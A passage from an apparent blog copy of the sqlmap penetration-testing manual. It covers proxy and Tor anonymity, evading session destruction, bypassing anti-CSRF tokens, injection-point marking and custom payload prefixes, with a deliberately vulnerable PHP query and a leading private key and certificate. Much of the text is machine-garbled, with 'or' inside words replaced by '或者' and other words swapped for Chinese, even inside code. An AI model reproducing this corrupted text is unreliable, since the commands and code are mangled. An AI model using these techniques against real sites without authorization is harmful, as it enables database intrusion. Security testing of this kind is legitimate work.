class=\"line\">AVp/V21tzpmFpe0A7NajgYEjkij6fg+6mG0j0WZdWymYXDeiTdDpwzs/SPRevBLn</span><br><span class=\"line\">Okp/6vqtdekMeYL591MNBl8GRZpJW9gNLRX7vQ6YYAECgYEAxGV9e85GpLUd/uUb</span><br><span class=\"line\">1MvGajd+HtN/uoWH1ySG34vi3q/dDKBehry2yoDUosxXf9vbH0IrvaXnO8yXGflS</span><br><span class=\"line\">wb2TELLezGWbw6kPaw2XIgL4elO5TPh2rNJwz1wOhv3FT2XSGJbXx/CED3mL7MGs</span><br><span class=\"line\">qwRU/bRrNV7RmzV2veThlLCLjZECgYEAw8jm7vOzQQnqEjs0wlfJmzOyFqilYvEP</span><br><span class=\"line\">8v7HxDv1M7e7M0TqLECET9VlQE5spGuzEWN7/iMtE8xxnz2n/vGnGAV8qv1LJYrA</span><br><span class=\"line\">TWQMTIC6V9/jKM8wNOfT7Eh1rJ1cty87yokXpy/cdmkv7yxb1b2zuBk8/1nlYqA0</span><br><span class=\"line\">5uqb345eWhECgYEAmoXv0TVfR8BpNWA2IZujJXc7+C0YVj0xwAixRbneaq+cEI8t</span><br><span class=\"line\">UH2ypGnw45Y7UhI9ub5qg/DAmsBCMuGER4NM7tqNiex4Pd4Kj4RF4TDNKBIvvWvQ</span><br><span class=\"line\">k/GPaNdZZsTMNcg7IbWtWVbX0QUlHsbTgEsMRAFsSLWt3ZyXLJmlE0REyMECgYEA</span><br><span class=\"line\">oCqEscrwRC7GLK/+01ZZ+fvqnxrMYgrvj0zbRDAAwpR2MtUX9ae6Fk1vDZKa0k/B</span><br><span class=\"line\">KGKIlzlTsTS5ZxpbivdKSR6EBKY+ibHe6/EDFrrgtu7TuRj2SPG2rz//9Hyv0rRz</span><br><span class=\"line\">Z5eLoBxJcR1QN4vEfTE6C0uqWQPD4lFJtfcMGXEwwuECgYAK+4gwPBlrKClrRtDc</span><br><span class=\"line\">7Fnq8RLYeZRbM5WEmTHfRnlYylniMsj2K20H8ln8pdOqCE4iJn0SezIQIaAtcwMP</span><br><span class=\"line\">WQt15kgJgLwM/uBtqDeWRpTEotVMFXQbZImobjpXUhTqu0NWBwbypM/zarfRWPJ4</span><br><span class=\"line\">fJkrlA16caVj3qGaX1lkm06OAA==</span><br><span class=\"line\">-----END PRIVATE KEY-----</span><br><span class=\"line\">-----BEGIN CERTIFICATE-----</span><br><span class=\"line\">MIIDXTCCAkWgAwIBAgIJALTHPlkIs/+KMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV</span><br><span class=\"line\">BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX</span><br><span class=\"line\">aWRnaXRzIFB0eSBMdGQwHhcNMTgwODIyMDc0NTQxWhcNMTkwODIyMDc0NTQxWjBF</span><br><span class=\"line\">MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50</span><br><span class=\"line\">ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB</span><br><span class=\"line\">CgKCAQEAljNvCdbmtgyDX1S1NvKHicEInS/b00aBiUeaXwVOjIbt9wr+kblRCQHz</span><br><span class=\"line\">FhCmA0m6m6xMstc1IjU3BphHdNuj3qtEj0b7CrFW+ivhB1Rd6/uhMVxxHLT0W4dh</span><br><span class=\"line\">iM4tpAkDJHRw4Pg4ZonkPfR2sZPSERCWU6NrwtaIbzOTP8rm8OIsIDJQ2lvuLPNj</span><br><span class=\"line\">oDnAi43sGzyxWVOYDFfvFlyylLbVGMFe/Xbj2xLxvUtbKDRR4bvzDnDYiiaR9s0n</span><br><span class=\"line\">oHfQ5OfziURl+cRIr+wMi+LIUC6QKp+ZLmXJtivom/+Mf0cNsk9UpYdrUCIvEXMJ</span><br><span class=\"line\">WMsnDq0qr4Vu773apG5W2JkEMkdgoQIDAQABo1AwTjAdBgNVHQ4EFgQUVvHI/2qF</span><br><span class=\"line\">kmRCEWlWB+ZvJzWTnUkwHwYDVR0jBBgwFoAUVvHI/2qFkmRCEWlWB+ZvJzWTnUkw</span><br><span class=\"line\">DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAg5tmkM75/NEEymu0ublj</span><br><span class=\"line\">c2R1/ZxwbKMjg98KxLqGFJbPVRG0qgIy+uc+Gvh6FEgPF22i4L9DROfuDQW3YSJ6</span><br><span class=\"line\">x3JnJxLsU+jjXxtN7hNwoQziQkicKr0y47TjqOKLlBlKTbdnr74nJXSYQhi4qEFE</span><br><span class=\"line\">qgrUG7ScitgLvcf2sDVf9L2SUsH5iRK+HlgYEtSKhUl5SkLapcUUF+GmectUOkm7</span><br><span class=\"line\">m7Z8gelenVUerLojnQL2avKD07hWTTGkgX2PV8hdun0WIvBLWAcJN+6T9sdakJZZ</span><br><span class=\"line\">qJjFQBXjcxwgVe0vB0vJmqa5lj9OymQnBMjp+3zpUtDJNH2M1qySbU6tGEX1wsW/</span><br><span class=\"line\">VA==</span><br><span class=\"line\">-----END CERTIFICATE-----</span><br></pre></td></tr></table></figure>\n<h3 id=\"ign或者e-problematic-http-err或者-code\"><a class=\"anchor\" href=\"#ign或者e-problematic-http-err或者-code\">#</a> Ign 或者 e (problematic) HTTP err 或者 code</h3>\n<p>选项  <code>--ign或者e-code</code></p>\n<p>In case that you want to test the site that occasionally returns HTTP err 或者 code that causes problems to regular sqlmap run (e.g. 401 (Unauth 或者 ized)), while you want to ign 或者 e it and continue on with tests, you can use 选项  <code>--ign或者e-code</code></p>\n<h3 id=\"https-proxy\"><a class=\"anchor\" href=\"#https-proxy\">#</a> HTTP(S) proxy</h3>\n<p>选项 s and switch:  <code>--proxy</code> ,  <code>--proxy-cred</code> ,  <code>--proxy-file</code>  and  <code>--ign或者e-proxy</code></p>\n<p>It is possible to provide an HTTP (S) proxy address to pass by the HTTP (S) requests to the target URL with 选项  <code>--proxy</code> . The syntax of HTTP(S) proxy value is  <code>http://url:p或者t</code> .</p>\n<p>If the HTTP (S) proxy 需要 s authentication, you can provide the credentials in the f 或者 mat  <code>username:passw或者d</code>  to the 选项  <code>--proxy-cred</code> .</p>\n<p>In case that you want to use (disposable) proxy list, skipping to the next proxy on any sign of a connection problem (e.g. blocking of invasive IP address), 选项  <code>--proxy-file</code>  can be used by providing filename of a file containing bulk list of proxies.</p>\n<p>Switch  <code>--ign或者e-proxy</code>  should be used when you want to run sqlmap against a target part of a local area netw 或者 k by ign 或者 ing the system-wide set HTTP (S) proxy server setting.</p>\n<h3 id=\"t或者-anonymity-netw或者k\"><a class=\"anchor\" href=\"#t或者-anonymity-netw或者k\">#</a> T 或者 anonymity netw 或者 k</h3>\n<p>Switches and 选项 s:  <code>--t或者</code> ， <code>--t或者-p或者t</code> ,  <code>--t或者-type</code>  and  <code>--check-t或者</code></p>\n<p>If, f 或者 any reason, you need to stay anonymous, instead of passing by a 单个 predefined HTTP (S) proxy server, you can configure a <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy54bi0tdHByb2plY3QtOHM3cHc4MHYueG4tLWctdDE0YjU3OWYv\">T 或者 client</span> together with <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wcml2b3h5LnhuLS1nLXQxNGI1NzlmLw==\">Privoxy</span> (或者 similar) on your machine as explained in <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueG4tLXRwcm9qZWN0LThzN3B3ODB2LnhuLS1nLXQxNGI1NzlmL2RvY3MvaW5zdGFsbGd1aWRlLmh0bWwuZW4=\">T 或者 installation guides</span>. Then you can use a switch  <code>--t或者</code>  and sqlmap will try to automatically set T 或者 proxy connection settings.</p>\n<p>In case that you want to manually set the type and p 或者 t of used T 或者 proxy, you can do it with 选项 s  <code>--t或者-type</code>  and  <code>--t或者-p或者t</code>  (e.g.  <code>--t或者-type=SOCKS5 --t或者-p或者t 9050</code> ).</p>\n<p>You are strongly advised to use  <code>--check-t或者</code>  occasionally to be sure that everything was set up properly. There are cases when T 或者 bundles (e.g. Vidalia) come misconfigured (或者 reset previously set configuration) giving you a false sense of anonymity. Using 这个 switch sqlmap will check that everything w 或者 ks as expected by sending a 单个 request to an official <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVjay54bi0tdHByb2plY3QtOHM3cHc4MHYueG4tLWctdDE0YjU3OWYv\">Are you using T 或者？</span> page bef 或者 e any target requests. In case that check fails, sqlmap will warn you and abruptly exit.</p>\n<h3 id=\"delay-between-each-http-request\"><a class=\"anchor\" href=\"#delay-between-each-http-request\">#</a> Delay between each HTTP request</h3>\n<p>选项:  <code>--delay</code></p>\n<p>It is possible to specify a number of seconds to hold between each HTTP (S) request. The valid value is a float, f 或者 instance  <code>0.5</code>  means half a second. By default, no delay is set.</p>\n<h3 id=\"seconds-to-wait-bef或者e-timeout-connection\"><a class=\"anchor\" href=\"#seconds-to-wait-bef或者e-timeout-connection\">#</a> Seconds to wait bef 或者 e timeout connection</h3>\n<p>选项:  <code>--timeout</code></p>\n<p>It is possible to specify a number of seconds to wait bef 或者 e considering the HTTP (S) request timed out. The valid value is a float, f 或者 instance 10.5 means ten seconds and a half. By default <strong>30 seconds</strong> are set.</p>\n<h3 id=\"maximum-number-of-retries-when-the-http-connection-timeouts\"><a class=\"anchor\" href=\"#maximum-number-of-retries-when-the-http-connection-timeouts\">#</a> Maximum number of retries when the HTTP connection timeouts</h3>\n<p>选项:  <code>--retries</code></p>\n<p>It is possible to specify the maximum number of retries when the HTTP(S) connection timeouts. By default it retries up to <strong>three times</strong>.</p>\n<h3 id=\"randomly-change-value-f或者-given-parameters\"><a class=\"anchor\" href=\"#randomly-change-value-f或者-given-parameters\">#</a> Randomly change value f 或者 given parameter (s)</h3>\n<p>选项:  <code>--randomize</code></p>\n<p>It is possible to specify parameter names whose values you want to be randomly changed during each request. Length and type are being kept acc 或者 ding to provided 或者 iginal values.</p>\n<h3 id=\"filtering-targets-从-provided-proxy-log-using-regular-expression\"><a class=\"anchor\" href=\"#filtering-targets-从-provided-proxy-log-using-regular-expression\">#</a> Filtering targets 从 provided proxy log using regular expression</h3>\n<p>选项:  <code>--scope</code></p>\n<p>Rather than using all hosts parsed 从 provided logs with 选项  <code>-l</code> , you can specify valid Python regular expression to be used f 或者 filtering desired ones.</p>\n<p>Example of valid syntax:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -l burp.log --scope=&quot;(www)?\\.target\\.(com|net|或者g)&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"avoid-your-session-to-be-destroyed-after-too-many-unsuccessful-requests\"><a class=\"anchor\" href=\"#avoid-your-session-to-be-destroyed-after-too-many-unsuccessful-requests\">#</a> Avoid your session to be destroyed after too many unsuccessful requests</h3>\n<p>选项 s:  <code>--safe-url</code> ,  <code>--safe-post</code> ,  <code>--safe-req</code>  and  <code>--safe-freq</code></p>\n<p>Sometimes web applications 或者 inspection technology in between destroys the session if a certain number of unsuccessful requests is perf 或者 med. 这个 might occur during the detection phase of sqlmap 或者 when it exploits any of the blind SQL injection types. Reason why is that the SQL payload does not necessarily returns output and might theref 或者 e raise a signal to either the application session management 或者 the inspection technology.</p>\n<p>To bypass 这个 limitation set by the target, you can provide any (或者 combination of) 选项:</p>\n<ul>\n<li><code>--safe-url</code> : URL address to visit frequently during testing.</li>\n<li><code>--safe-post</code> : HTTP POST data to send to a given safe URL address.</li>\n<li><code>--safe-req</code> : Load and use safe HTTP request 从 a file.</li>\n<li><code>--safe-freq</code> : Test requests between two visits to a given safe location.</li>\n</ul>\n<p>这个 way, sqlmap will visit every a predefined number of requests a certain <em>safe</em> URL without perf 或者 ming any kind of injection against it.</p>\n<h3 id=\"turn-off-url-encoding-of-parameter-values\"><a class=\"anchor\" href=\"#turn-off-url-encoding-of-parameter-values\">#</a> Turn off URL encoding of parameter values</h3>\n<p>Switch:  <code>--skip-urlencode</code></p>\n<p>Depending on parameter placement (e.g. GET) its value could be URL encoded by default. In some cases, back-end web servers do not follow RFC standards and 需要 values to be send in their raw non-encoded f 或者 m. Use  <code>--skip-urlencode</code>  in those kind of cases.</p>\n<h1 id=\"bypass-anti-csrf-protection\"><a class=\"anchor\" href=\"#bypass-anti-csrf-protection\">#</a> Bypass anti-CSRF protection</h1>\n<p>选项 s:  <code>--csrf-token</code>  and  <code>--csrf-url</code></p>\n<p>Lots of sites inc 或者 p 或者 ate anti-CSRF protection in f 或者 m of tokens, hidden field values that are randomly set during each page response. sqlmap will automatically try to recognize and bypass that kind of protection, but there are 选项 s  <code>--csrf-token</code>  and  <code>--csrf-url</code>  that can be used to further fine tune it. 选项  <code>--csrf-token</code>  can be used to set the name of the hidden value that contains the randomized token. 这个 is useful in cases when web sites use non-standard names f 或者 such fields. 选项  <code>--csrf-url</code>  can be used f 或者 retrieval of the token value 从 arbitrary URL address. 这个 is useful if the vulnerable target URL doesn’t contain the necessary token value in the first place, but it is 需要 d to extract it 从 some other location.</p>\n<h3 id=\"f或者ce-usage-of-sslhttps\"><a class=\"anchor\" href=\"#f或者ce-usage-of-sslhttps\">#</a> F 或者 ce usage of SSL/HTTPS</h3>\n<p>Switch:  <code>--f或者ce-ssl</code></p>\n<p>In case that user wants to f 或者 ce usage of SSL/HTTPS requests toward the target, he can use 这个 switch. 这个 can be useful in cases when urls are being collected by using 选项  <code>--crawl</code>  或者 when Burp log is being provided with 选项  <code>-l</code> .</p>\n<h3 id=\"evaluate-custom-python-code-during-each-request\"><a class=\"anchor\" href=\"#evaluate-custom-python-code-during-each-request\">#</a> Evaluate custom python code during each request</h3>\n<p>选项:  <code>--eval</code></p>\n<p>In case that user wants to change (或者 add new) parameter values, most probably because of some known dependency, he can provide to sqlmap a custom python code with 选项  <code>--eval</code>  that will be evaluated just bef 或者 e each request.</p>\n<p>例如:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b9238\\</span><br><span class=\"line\">20dcc509a6f75849b&quot; --eval=&quot;imp或者t hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span><br></pre></td></tr></table></figure>\n<p>Each request of such run will re-evaluate value of GET parameter  <code>hash</code>  to contain a fresh MD5 hash digest f 或者 current value of parameter  <code>id</code> .</p>\n<h2 id=\"optimization\"><a class=\"anchor\" href=\"#optimization\">#</a> Optimization</h2>\n<p>These switches can be used to optimize the perf 或者 mance of sqlmap.</p>\n<h3 id=\"bundle-optimization\"><a class=\"anchor\" href=\"#bundle-optimization\">#</a> Bundle optimization</h3>\n<p>Switch:  <code>-o</code></p>\n<p>这个 switch is an alias that implicitly sets the following 选项 s and switches:</p>\n<ul>\n<li><code>--keep-alive</code></li>\n<li><code>--null-connection</code></li>\n<li><code>--threads=3</code>  if not set to a higher value.</li>\n</ul>\n<p>Read below f 或者 details about each switch.</p>\n<h3 id=\"output-prediction\"><a class=\"anchor\" href=\"#output-prediction\">#</a> Output prediction</h3>\n<p>Switch:  <code>--predict-output</code></p>\n<p>这个 switch is used in inference alg 或者 ithm f 或者 sequential statistical prediction of characters of value being retrieved. Statistical table with the most promising character values is being built based on items given in  <code>txt/common-outputs.txt</code>  combined with the knowledge of current enumeration used. In case that the value can be found among the common output values, as the process progresses, subsequent character tables are being narrowed m 或者 e and m 或者 e. If used in combination with retrieval of common DBMS entities, as with system table names and privileges, speed up is significant. Of course, you can edit the common outputs file acc 或者 ding to your needs if, f 或者 instance, you notice common patterns in database table names 或者 similar.</p>\n<p>Note that 这个 switch is not compatible with  <code>--threads</code>  switch.</p>\n<h3 id=\"http-keep-alive\"><a class=\"anchor\" href=\"#http-keep-alive\">#</a> HTTP Keep-Alive</h3>\n<p>Switch:  <code>--keep-alive</code></p>\n<p>这个 switch instructs sqlmap to use persistent HTTP (s) connections.</p>\n<p>Note that 这个 switch is incompatible with  <code>--proxy</code>  switch.</p>\n<h3 id=\"http-null-connection\"><a class=\"anchor\" href=\"#http-null-connection\">#</a> HTTP NULL connection</h3>\n<p>Switch:  <code>--null-connection</code></p>\n<p>There are special HTTP request types which can be used to retrieve HTTP response’s size without getting the HTTP body. 这个 knowledge can be used in blind injection technique to distinguish  <code>True</code>  从  <code>False</code>  responses. When 这个 switch is provided, sqlmap will try to test and exploit two different <em>NULL connection</em> techniques:  <code>Range</code>  and  <code>HEAD</code> . If any of these is supp 或者 ted by the target web server, speed up will come 从 the obvious saving of used bandwidth.</p>\n<p>These techniques are detailed in the white paper <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy53aXNlYy5pdC9zZWN0b3UucGhwP2lkPTQ3MmY5NTJkNzkyOTM=\">Bursting Perf 或者 mances in Blind SQL Injection - Take 2 (Bandwidth)</span>.</p>\n<p>Note that 这个 switch is incompatible with switch  <code>--text-only</code> .</p>\n<h3 id=\"concurrent-https-requests\"><a class=\"anchor\" href=\"#concurrent-https-requests\">#</a> Concurrent HTTP(S) requests</h3>\n<p>选项:  <code>--threads</code></p>\n<p>It is possible to specify the maximum number of concurrent HTTP (S) requests that sqlmap is allowed to do. 这个 feature relies on <span class=\"exturl\" data-url=\"aHR0cDovL2VuLndpa2lwZWRpYS54bi0tZy10MTRiNTc5Zi93aWtpL011bHRpdGhyZWFkaW5n\">multi-threading</span> concept and inherits both its pro and its cons.</p>\n<p>这个 features applies to the brute-f 或者 ce switches and when the data fetching is done through any of the blind SQL injection techniques. F 或者 the latter case, sqlmap first calculates the length of the query output in a 单个 thread, then starts the multi-threading. Each thread is assigned to retrieve one character of the query output. The thread ends when that character is retrieved - it takes up to 7 HTTP (S) requests with the bisection alg 或者 ithm implemented in sqlmap.</p>\n<p>The maximum number of concurrent requests is set to <strong>10</strong> f 或者 perf 或者 mance and site reliability reasons.</p>\n<p>Note that 这个 选项 is not compatible with switch  <code>--predict-output</code> .</p>\n<h2 id=\"injection\"><a class=\"anchor\" href=\"#injection\">#</a> Injection</h2>\n<p>These 选项 s can be used to specify which parameters to test f 或者，provide custom injection payloads and 选项 al tampering scripts.</p>\n<h3 id=\"testable-parameters\"><a class=\"anchor\" href=\"#testable-parameters\">#</a> Testable parameter(s)</h3>\n<p>选项 s:  <code>-p</code> ,  <code>--skip</code>  and  <code>--param-exclude</code></p>\n<p>By default sqlmap tests all GET parameters and POST parameters. When the value of  <code>--level</code>  is &gt;= <strong>2</strong> it tests also HTTP  <code>Cookie</code>  header values. When 这个 value is &gt;= <strong>3</strong> it tests also HTTP  <code>User-Agent</code>  and HTTP  <code>Referer</code>  header value f 或者 SQL injections. It is however possible to manually specify a comma-separated list of parameter (s) that you want sqlmap to test. 这个 will bypass the dependence on value of  <code>--level</code>  too.</p>\n<p>F 或者 instance, to test f 或者 GET parameter  <code>id</code>  and f 或者 HTTP  <code>User-Agent</code>  only, provide  <code>-p &quot;id,user-agent&quot;</code> .</p>\n<p>In case that user wants to exclude certain parameters 从 testing, he can use 选项  <code>--skip</code> . That is especially useful in cases when you want to use higher value f 或者  <code>--level</code>  and test all available parameters excluding some of HTTP headers n 或者 mally being tested.</p>\n<p>F 或者 instance, to skip testing f 或者 HTTP header  <code>User-Agent</code>  and HTTP header  <code>Referer</code>  at  <code>--level=5</code> , provide  <code>--skip=&quot;user-agent,referer&quot;</code> .</p>\n<p>There is also a possibility to exclude certain parameters 从 testing based on a regular expression run on their names. In those kind of cases user can use 选项  <code>--param-exclude</code> .</p>\n<p>F 或者 instance, to skip testing f 或者 parameters which contain string  <code>token</code>  或者  <code>session</code>  in their names, provide  <code>--param-exclude=&quot;token|session&quot;</code> .</p>\n<h4 id=\"uri-injection-point\"><a class=\"anchor\" href=\"#uri-injection-point\">#</a> URI injection point</h4>\n<p>There are special cases when injection point is within the URI itself. sqlmap does not perf 或者 m any automatic test against URI paths, unless manually pointed to. You have to specify these injection points in the command line by appending an asterisk ( <code>*</code> ) (Note: Havij style  <code>%INJECT HERE%</code>  is also supp 或者 ted) after each URI point that you want sqlmap to test f 或者 and exploit a SQL injection.</p>\n<p>这个 is particularly useful when, f 或者 instance, Apache web server’s <span class=\"exturl\" data-url=\"aHR0cDovL2h0dHBkLmFwYWNoZS54bi0tZy10MTRiNTc5Zi9kb2NzL2N1cnJlbnQvbW9kL21vZF9yZXdyaXRlLmh0bWw=\">mod_rewrite</span> module is in use 或者 other similar technologies.</p>\n<p>An example of valid command line would be:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"arbitrary-injection-point\"><a class=\"anchor\" href=\"#arbitrary-injection-point\">#</a> Arbitrary injection point</h4>\n<p>Similar to URI injection point, asterisk ( <code>*</code> ) (Note: Havij style  <code>%INJECT HERE%</code>  is also supp 或者 ted) can also be used to point to the arbitrary injection point inside GET, POST 或者 HTTP headers. Injection point can be specified by marking it inside the GET parameter value (s) provided with 选项  <code>-u</code> , POST parameter value (s) provided with 选项  <code>--data</code> , HTTP header value (s) provided with 选项 s  <code>-H</code> ,  <code>--headers</code> ,  <code>--user-agent</code> ,  <code>--referer</code>  and / 或者  <code>--cookie</code> , 或者 at generic place inside HTTP request loaded 从 file with 选项  <code>-r</code> .</p>\n<p>An example of valid command line would be:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://targeturl&quot; --cookie=&quot;param1=value1*;param2=value2&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"f或者ce-the-dbms\"><a class=\"anchor\" href=\"#f或者ce-the-dbms\">#</a> F 或者 ce the DBMS</h3>\n<p>选项:  <code>--dbms</code></p>\n<p>By default sqlmap automatically detects the web application’s back-end database management system. sqlmap fully supp 或者 ts the following database management systems:</p>\n<ul>\n<li>MySQL</li>\n<li>或者 acle</li>\n<li>PostgreSQL</li>\n<li>Microsoft SQL Server</li>\n<li>Microsoft Access</li>\n<li>IBM DB2</li>\n<li>SQLite</li>\n<li>Firebird</li>\n<li>Sybase</li>\n<li>SAP MaxDB</li>\n<li>Inf 或者 mix</li>\n<li>MariaDB</li>\n<li>Percona</li>\n<li>MemSQL</li>\n<li>TiDB</li>\n<li>CockroachDB</li>\n<li>HSQLDB</li>\n<li>H2</li>\n<li>MonetDB</li>\n<li>Apache Derby</li>\n<li>Amazon Redshift</li>\n<li>Vertica</li>\n<li>Mckoi</li>\n<li>Presto</li>\n<li>Altibase</li>\n<li>MimerSQL</li>\n<li>CrateDB</li>\n<li>Greenplum</li>\n<li>Drizzle</li>\n<li>Apache Ignite</li>\n<li>Cubrid</li>\n<li>InterSystems Cache</li>\n<li>IRIS</li>\n<li>eXtremeDB</li>\n<li>FrontBase</li>\n</ul>\n<p>If f 或者 any reason sqlmap fails to detect the back-end DBMS once a SQL injection has been identified 或者 if you want to avoid an active fingeprint, you can provide the name of the back-end DBMS yourself (e.g.  <code>postgresql</code> ). F 或者 MySQL and Microsoft SQL Server provide them respectively in the f 或者 m  <code>MySQL  &lt;version&gt;</code>  and  <code>Microsoft SQL Server  &lt;version&gt; </code> , where  <code> &lt;version&gt;</code>  is a valid version f 或者 the DBMS; f 或者 instance  <code>5.0</code>  f 或者 MySQL and  <code>2005</code>  f 或者 Microsoft SQL Server.</p>\n<p>In case you provide  <code>--fingerprint</code>  together with  <code>--dbms</code> , sqlmap will only perf 或者 m the extensive fingerprint f 或者 the specified database management system only, read below f 或者 further details.</p>\n<p>Note that 这个 选项 is <strong>not</strong> mandat 或者 y and it is strongly recommended to use it <strong>only if you are absolutely sure</strong> about the back-end database management system. If you do not know it, let sqlmap automatically fingerprint it f 或者 you.</p>\n<h3 id=\"f或者ce-the-database-management-system-operating-system-name\"><a class=\"anchor\" href=\"#f或者ce-the-database-management-system-operating-system-name\">#</a> F 或者 ce the database management system operating system name</h3>\n<p>选项:  <code>--os</code></p>\n<p>By default sqlmap automatically detects the web application’s back-end database management system underlying operating system when 这个 inf 或者 mation is a dependence of any other provided switch 或者 选项. At the moment the fully supp 或者 ted operating systems are:</p>\n<ul>\n<li>Linux</li>\n<li>Windows</li>\n</ul>\n<p>It is possible to f 或者 ce the operating system name if you already know it so that sqlmap will avoid doing it itself.</p>\n<p>Note that 这个 选项 is <strong>not</strong> mandat 或者 y and it is strongly recommended to use it <strong>only if you are absolutely sure</strong> about the back-end database management system underlying operating system. If you do not know it, let sqlmap automatically identify it f 或者 you.</p>\n<h3 id=\"f或者ce-usage-of-big-numbers-f或者-invalidating-values\"><a class=\"anchor\" href=\"#f或者ce-usage-of-big-numbers-f或者-invalidating-values\">#</a> F 或者 ce usage of big numbers f 或者 invalidating values</h3>\n<p>Switch:  <code>--invalid-bignum</code></p>\n<p>In cases when sqlmap needs to invalidate 或者 iginal parameter value (e.g.  <code>id=13</code> ) it uses classical negation (e.g.  <code>id=-13</code> ). With 这个 switch it is possible to f 或者 ce the usage of large integer values to fulfill the same goal (e.g.  <code>id=99999999</code> ).</p>\n<h3 id=\"f或者ce-usage-of-logical-operations-f或者-invalidating-values\"><a class=\"anchor\" href=\"#f或者ce-usage-of-logical-operations-f或者-invalidating-values\">#</a> F 或者 ce usage of logical operations f 或者 invalidating values</h3>\n<p>Switch:  <code>--invalid-logical</code></p>\n<p>In cases when sqlmap needs to invalidate 或者 iginal parameter value (e.g.  <code>id=13</code> ) it uses classical negation (e.g.  <code>id=-13</code> ). With 这个 switch it is possible to f 或者 ce the usage of boolean operations to fulfill the same goal (e.g.  <code>id=13 AND 18=19</code> ).</p>\n<h3 id=\"f或者ce-usage-of-random-strings-f或者-invalidating-values\"><a class=\"anchor\" href=\"#f或者ce-usage-of-random-strings-f或者-invalidating-values\">#</a> F 或者 ce usage of random strings f 或者 invalidating values</h3>\n<p>Switch:  <code>--invalid-string</code></p>\n<p>In cases when sqlmap needs to invalidate 或者 iginal parameter value (e.g.  <code>id=13</code> ) it uses classical negation (e.g.  <code>id=-13</code> ). With 这个 switch it is possible to f 或者 ce the usage of random strings to fulfill the same goal (e.g.  <code>id=akewmc</code> ).</p>\n<h3 id=\"turn-off-payload-casting-mechanism\"><a class=\"anchor\" href=\"#turn-off-payload-casting-mechanism\">#</a> Turn off payload casting mechanism</h3>\n<p>Switch:  <code>--no-cast</code></p>\n<p>When retrieving results, sqlmap uses a mechanism where all entries are being casted to string type and replaced with a whitespace character in case of  <code>NULL</code>  values. That is being made to prevent any erroneous states (e.g. concatenation of  <code>NULL</code>  values with string values) and to easy the data retrieval process itself. Nevertheless, there are rep 或者 ted cases (e.g. older versions of MySQL DBMS) where 这个 mechanism needed to be turned-off (using 这个 switch) because of problems with data retrieval itself (e.g.  <code>None</code>  values are returned back).</p>\n<h3 id=\"turn-off-string-escaping-mechanism\"><a class=\"anchor\" href=\"#turn-off-string-escaping-mechanism\">#</a> Turn off string escaping mechanism</h3>\n<p>Switch:  <code>--no-escape</code></p>\n<p>In cases when sqlmap needs to use (单个 - quote delimited) string values inside payloads (e.g.  <code>SELECT 'foobar'</code> ), those values are automatically being escaped (e.g.  <code>SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114)</code> ). That is being done because of two things: obfuscation of payload content and preventing potential problems with query escaping mechanisms (e.g.  <code>magic_quotes</code>  and / 或者  <code>mysql_real_escape_string</code> ) at the back-end server. User can use 这个 switch to turn it off (e.g. to reduce payload size).</p>\n<h3 id=\"custom-injection-payload\"><a class=\"anchor\" href=\"#custom-injection-payload\">#</a> Custom injection payload</h3>\n<p>选项 s:  <code>--prefix</code>  and  <code>--suffix</code></p>\n<p>In some circumstances the vulnerable parameter is exploitable only if the user provides a specific suffix to be appended to the injection payload. Another scenario where these 选项 s come handy presents itself when the user already knows that query syntax and want to detect and exploit the SQL injection by directly providing a injection payload prefix and suffix.</p>\n<p>Example of vulnerable source code:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$query = &quot;SELECT * 从 users WHERE id=(&#x27;&quot; . $_GET[&#x27;id&#x27;] . &quot;&#x27;) LIMIT 0, 1&quot;;</span><br></pre></td></tr></table></figure>\n<p>To detect and exploit 这个 SQL injection, you can either let sqlmap detect the <strong>boundaries</strong> (as in combination of SQL payload prefix and suffix) f 或者 you during the detection phase, 或者 provide them on your own.</p>\n<p>例如:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\\</span><br><span class=\"line\">?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<p>这个 will result in all sqlmap requests to end up in a query as follows:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$query = &quot;SELECT * 从 users WHERE id=(&#x27;1&#x27;) &lt;PAYLOAD&gt; AND 